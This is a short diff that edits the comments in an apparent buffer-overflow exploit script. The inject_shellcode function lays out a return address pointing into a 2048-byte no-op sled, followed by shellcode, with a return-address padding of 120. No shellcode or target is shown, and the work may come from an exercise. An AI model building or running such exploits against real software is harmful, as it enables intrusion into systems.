@@ -13,7 +13,7 @@ def inject_shellcode():
     # ---
     # 8 bytes: address somewhere in no-ops to reach shellcode
     # ---
-    # ? bytes: (no ops) <- Goal is to jump somewhere here
+    # 2048 bytes: (no ops) <- Goal is to jump somewhere here
     # ? bytes: (shellcode)
 
     ret_addr_padding = 120
